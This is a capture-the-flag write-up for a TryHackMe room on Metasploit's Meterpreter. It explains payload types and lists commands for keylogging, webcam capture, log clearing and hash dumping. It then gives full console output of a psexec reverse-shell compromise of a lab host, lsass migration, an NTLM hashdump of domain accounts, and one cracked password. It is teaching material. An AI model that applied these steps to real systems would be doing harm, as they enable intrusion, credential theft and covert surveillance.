---
title: Metasploit - Meterpreter
desc: >-
  THM: Take a deep dive into Meterpreter, and see how in-memory payloads can be
  used for post-exploitation.
---
## Task 1 - Introduction to Meterpreter
Meterpreter is a Metasploit payload that runs on the target system and acts as an agent within a command and control architecture. Meterpreter runs on the target system but is not installed on it. It runs in memory (RAM) and does not write itself to the disk on the target in an effort avoid detection during an antivirus scan. On a target system, Meterpreter behaves as a process.

Meterpreter also aims to be avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs.

It should be noted that Meterpreter is recognized by major antivirus software.

## Task 2 - Meterpreter Flavors
Metasploit payloads can be split into two categories: inline (also called single) and staged. Staged payloads are sent to the target in two steps. An initial part is installed (the stager) and requests the rest of the payload. This allows for a smaller initial payload size. The inline payloads are sent ina single step. 

Meterpreter payloads are also divided into staged and inline versions. A list of Meterpreter payloads can be obtained by using the command `msfvenom --list payloads | grep meterpreter`.

The decision on which version of Meterpreter to use will mostly be based on three factors:
- The target operating system.
- Components available on the target system (ie: Python, PHP, etc.)
- Network connection type you can have with the target system (ie: Are raw TCP connections allowed?)

If not using Meterpreter as a standalone payload generated by Msfvenonm, our choices will be limited to using exploits from Msfconsole.

## Task 3 - Meterpreter Commands
Typing `help` on any Meterpreter session (shown by `meterpreter>` in the prompt) will list all available commands. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.

Meterpreter provides three primary categories of tools:
- Built-in commands
- Meterpreter tools
- Meterpreter scripting

When running the `help` command, we will see Meterpreter commands are listed under different categories:
- Core commands
- File system commands
- Networking commands
- System commands
- User interface commands
- Webcam commands
- Audio output commands
- Elevate commands
- Password database commands
- Timestomp commands

Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.

### Core Commands
- `background`: Backgrounds the current session.
- `exit`: Terminates the Meterpreter session.
- `guid`: Get the session GUID (Globally Unique Identifier).
- `help`: Displays the help menu.
- `info`: Displays information about a Post module.
- `irb`: Opens an interactive Ruby shell on the current session.
- `load`: Loads one or more Meterpreter extensions.
- `migrate`: Allows you to migrate Meterpreter to another process.
- `run`: Executes a Meterpreter script or Post module.
- `sessions`: Quickly switch to another session.

### File System Commands
- `cd`: Change directory.
- `ls`: List files in the current directory (`dir` will also work).
- `pwd`: Prints the current working directory.
- `edit`: Allows you to edit a file.
- `cat`: Shows contents of a file to the screen.
- `rm`: Deletes the specified file.
- `search`: Search for files.
- `upload`: Upload a file or directory.
- `download`: Download a file or directory.

### Networking Commands
- `arp`: Displays the host ARP cache.
- `ifconfig`: Displays network interfaces available on the target system.
- `netstat`: Displays the network connections.
- `portfwd`: Forwards a local port to a remote service.
- `route`: Allows you to view and modify the routing table.

### System Commands
- `clearev`: Clears the event logs.
- `execute`: Executes a command.
- `getpid`: Shows the current process identifier.
- `getuid`: Shows the user what Meterpreter is running as.
- `kill`: Terminates a process.
- `pkill`: Terminates processes by name.
- `ps`: Lists running processes.
- `reboot`: Reboots the remote computer.
- `shell`: Drops into a system command shell.
- `shutdown`: Shuts down the remote computer.
- `sysinfo`: Gets information about the remote system.

### Other Commands
- `idletime`: Returns the number of seconds the remote user has been idle.
- `keyscan_dump`: Dumps the keystroke buffer.
- `keyscan_start`: Starts capturing keystrokes.
- `keyscan_stop`: Stops capturing keystrokes.
- `screenshare`: Allows you to watch the remote user's desktop in real time.
- `screenshot`: Grabs a screenshot of the interactive desktop.
- `record_mic`: Records audio from the default microphone for X seconds.
- `webcam_chat`: Starts a video chat.
- `webcam_list`: Lists webcams.
- `webcam_snap`: Takes a snapshot from the specified webcam.
- `webcam_stream`: Plays a video stream from the specified webcam.
- `getsystem`: Attempts to elevate your privilege to that of local system.
- `hashdump`: Dumps the contents of the SAM database.

## Task 4 - Post-Exploitation with Meterpreter
This section includes a brief discussion on some of the more common commands used during engagements. Nothing further needs to be added here.

## Task 5 - Post Exploitation Challenge
We are provided with initial credentials which we can use to compromise SMB as suggested: `ballen:Password1`.

Let's go ahead and open Metasploit using the `msfconsole` command. Since we are advised that our initial foothold can be established by exploiting the SMB service, lets go ahead and use the `exploit/windows/smb/psexec` exploit with the provided credentials.

This module uses a valid username and password (or password hash) to execute an arbitrary payload.

```console
msf6 > use exploit/windows/smb/psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set rhost 10.10.244.120
rhost => 10.10.244.120
msf6 exploit(windows/smb/psexec) > set smbuser ballen
smbuser => ballen
msf6 exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
msf6 exploit(windows/smb/psexec) > set lhost 10.13.17.49
lhost => 10.13.17.49
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                10.10.244.120    yes       The target host(s), see https://docs.metasploit.com/docs/using
                                                    -metasploit/basics/using-metasploit.html
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass               Password1        no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...)
                                                     or a normal read/write folder share
   SMBUser               ballen           no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.13.17.49      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.13.17.49:4444 
[*] 10.10.244.120:445 - Connecting to the server...
[*] 10.10.244.120:445 - Authenticating to 10.10.244.120:445 as user 'ballen'...
[*] 10.10.244.120:445 - Selecting PowerShell target
[*] 10.10.244.120:445 - Executing the payload...
[+] 10.10.244.120:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.10.244.120
[*] Meterpreter session 1 opened (10.13.17.49:4444 -> 10.10.244.120:49181) at 2023-03-06 10:33:51 -0700

meterpreter >  
```
We can use the `sysinfo` command to get more information on the target system.

```console
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter >
```
In order to find any possible shares created by the user we can use the Metaploit module `post/windows/gather/enum_shares`. Note that we need to background our Meterpreter session before we can use the module.

```console
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_shares 
msf6 post(windows/gather/enum_shares) > show options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate recently mapped shares
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_shares) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.13.17.49:4444 -> 10.10.244.120:49181 (10.
                                                                      10.244.120)

msf6 post(windows/gather/enum_shares) > set session 1
session => 1
msf6 post(windows/gather/enum_shares) > run

[*] Running module against ACME-TEST (10.10.244.120)
[*] The following shares were found:
[*]     Name: SYSVOL
[*]     Path: C:\Windows\SYSVOL\sysvol
[*]     Remark: Logon server share 
[*]     Type: DISK
[*] 
[*]     Name: NETLOGON
[*]     Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*]     Remark: Logon server share 
[*]     Type: DISK
[*] 
[*]     Name: speedster
[*]     Path: C:\Shares\speedster
[*]     Type: DISK
[*] 
[*] Post module execution completed 
```
To dump the NTLM hashes, we can use the `hashdump` command in Meterpreter. We will need to migrate to the `lsass.exe` process before we can use hashdump.

```console
msf6 post(windows/gather/enum_shares) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name                Arch  Session  User                          Path
 ---   ----  ----                ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System              x64   0
 68    4     Registry            x64   0
 396   4     smss.exe            x64   0
 488   684   dwm.exe             x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 548   536   csrss.exe           x64   0
 620   612   csrss.exe           x64   1
 668   536   wininit.exe         x64   0
 684   612   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 748   668   services.exe        x64   0
 764   668   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 884   748   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 896   748   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 948   748   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 992   748   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1060  748   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1176  748   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1184  748   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1192  748   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1240  748   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1292  748   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1376  748   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1408  748   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1688  748   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1788  884   CompatTelRunner.ex  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\CompatTelRunner.
             e                                                                exe
 2164  668   fontdrvhost.exe     x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 2172  684   fontdrvhost.exe     x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 2204  748   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2264  748   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2280  748   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2332  748   amazon-ssm-agent.e  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-s
             xe                                                               sm-agent.exe
 2348  748   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2388  748   LiteAgent.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\Lit
                                                                              eAgent.exe
 2416  748   ismserv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
 2440  748   dfsrs.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
 2448  748   dfssvc.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
 2476  748   Microsoft.ActiveDi  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDire
             rectory.WebService                                               ctory.WebServices.exe
             s.exe
 2556  748   dns.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
 2872  2332  ssm-agent-worker.e  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ssm-agen
             xe                                                               t-worker.exe
 2880  2872  conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2956  748   vds.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 3120  3240  conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3232  684   LogonUI.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 3240  3136  powershell.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShel
                                                                              l\v1.0\powershell.exe
 3308  1788  conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3696  748   msdtc.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 3876  748   svchost.exe         x64   0

meterpreter > migrate 764
[*] Migrating from 3240 to 764...
[*] Migration completed successfully.

meterpreter > getpid
Current pid: 764

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:b0193410734347e986c59daebea2e2af:::
```
Let's use an online rainbow table to find *jchambers* cleartext password. We can use something like [CrackStation](https://crackstation.net/) to do this.

`69596c7aa1e8daee17f8e78870e25a5c:NTLM:Trustno1`

Let's find where the "secrets.txt" file is located and display its contents.

```console
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 01:44:27 -0600

meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
My Twitter password is KDSvbsw3849!
```
Let's find where the "realsecret.txt" file is located.

```console
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 02:30:24 -0600

meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
The Flash is the fastest man alive
```
